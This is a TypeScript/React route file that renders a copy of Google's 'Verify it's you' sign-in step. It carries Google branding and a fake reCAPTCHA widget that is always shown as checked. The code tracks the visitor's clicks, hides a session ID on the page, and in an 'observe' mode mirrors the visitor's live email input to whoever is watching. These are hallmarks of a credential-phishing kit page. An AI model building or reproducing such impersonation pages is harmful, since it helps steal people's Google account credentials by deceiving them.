import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeAccountChip,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/recaptcha")({
  head: () => ({
    meta: [
      { title: "Verify it’s you - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeRecaptchaPage,
});

const RECAPTCHA_LOGO =
  "https://www.gstatic.com/images/icons/material/product/2x/recaptcha_48dp.png";

/** Same widget as captcha, permanently completed with green checkmark. */
function CompletedRecaptcha() {
  return (
    <div
      className="ge-rc is-checked"
      role="status"
      aria-label="I'm not a robot — verified"
    >
      <span className="ge-rc-check-wrap" aria-hidden="true">
        <span className="ge-rc-box">
          <svg className="ge-rc-tick" viewBox="0 0 24 24">
            <path
              fill="#009E73"
              d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
            />
          </svg>
        </span>
      </span>
      <span className="ge-rc-label">I&apos;m not a robot</span>
      <span className="ge-rc-brand" aria-hidden="true">
        <img className="ge-rc-logo" src={RECAPTCHA_LOGO} alt="" width={32} height={32} />
        <span className="ge-rc-brand-text">
          <span className="ge-rc-name">reCAPTCHA</span>
          <span className="ge-rc-links">
            <span>Privacy</span>
            <span> - </span>
            <span>Terms</span>
          </span>
        </span>
      </span>
    </div>
  );
}

const GE_RECAPTCHA_CSS = `
${GE_SHELL_CSS}

.ge-captcha .ge-title { margin-top: 24px; }

.ge-captcha-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-captcha-lead a {
  color: var(--gm3-primary);
  font-weight: 500;
  text-decoration: none;
}
.ge-captcha-lead a:hover { text-decoration: underline; }

.ge-captcha-prompt {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
@media (min-width: 900px) {
  .ge-captcha .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-captcha-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-captcha-form { margin-top: 22px; }
}

/* Fake reCAPTCHA — light theme widget on dark page (completed) */
.ge-rc {
  display: flex;
  align-items: center;
  width: 304px;
  height: 78px;
  padding: 0 12px 0 14px;
  margin: 0;
  border: 1px solid #d3d3d3;
  border-radius: 3px;
  background: #f9f9f9;
  box-shadow: 0 0 4px 1px rgba(0,0,0,.08);
  cursor: default;
  text-align: left;
  font-family: Roboto, Helvetica, Arial, sans-serif;
  color: #000;
  box-sizing: border-box;
  user-select: none;
}
.ge-rc-check-wrap {
  flex-shrink: 0;
  margin-right: 12px;
}
.ge-rc-box {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 28px;
  height: 28px;
  border: 2px solid #c1c1c1;
  border-radius: 2px;
  background: #fff;
  box-sizing: border-box;
}
.ge-rc.is-checked .ge-rc-box {
  border-color: transparent;
  background: transparent;
}
.ge-rc-tick {
  width: 30px;
  height: 30px;
  display: block;
}
.ge-rc-label {
  flex: 1;
  min-width: 0;
  font-size: 14px;
  font-weight: 400;
  line-height: 17px;
  color: #000;
}
.ge-rc-brand {
  display: flex;
  flex-direction: column;
  align-items: center;
  flex-shrink: 0;
  width: 58px;
  margin-left: 8px;
}
.ge-rc-logo {
  display: block;
  width: 32px;
  height: 32px;
  margin-bottom: 2px;
  object-fit: contain;
}
.ge-rc-brand-text {
  display: flex;
  flex-direction: column;
  align-items: center;
  line-height: 1;
}
.ge-rc-name {
  font-size: 10px;
  font-weight: 400;
  color: #555;
  letter-spacing: 0;
}
.ge-rc-links {
  font-size: 8px;
  color: #555;
  margin-top: 2px;
  white-space: nowrap;
}

.ge-rc-wrap {
  position: relative;
  width: fit-content;
  max-width: 100%;
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: flex-end;
  margin-top: auto;
  padding-top: 32px;
  gap: 8px;
  width: 100%;
}
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
`;

function GeRecaptchaPage() {
  const { trackClick, geNavigate, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());

  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    trackClick("Next");
    geNavigate("/ge/loading");
  };

  return (
    <div className="ge-shell ge-captcha">
      <GeFontStyle />
      <style>{GE_RECAPTCHA_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Verify it{"\u2019"}s you</h1>
          <p className="ge-captcha-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in.{" "}
            <a
              href="https://support.google.com/accounts/answer/40039?hl=en"
              target="_blank"
              rel="noopener noreferrer"
              onClick={() => trackClick("Learn more")}
            >
              Learn more
            </a>
          </p>
          <GeAccountChip email={email} onClick={() => trackClick("Switch account")} />
        </div>

        <div className="ge-pane-right">
          <p className="ge-captcha-prompt">Confirm you{"\u2019"}re not a robot</p>
          <form className="ge-captcha-form" onSubmit={handleNext} autoComplete="off">
            <div className="ge-rc-wrap">
              <CompletedRecaptcha />
            </div>

            <div className="ge-actions">
              <button type="submit" className="ge-btn ge-btn-next">
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
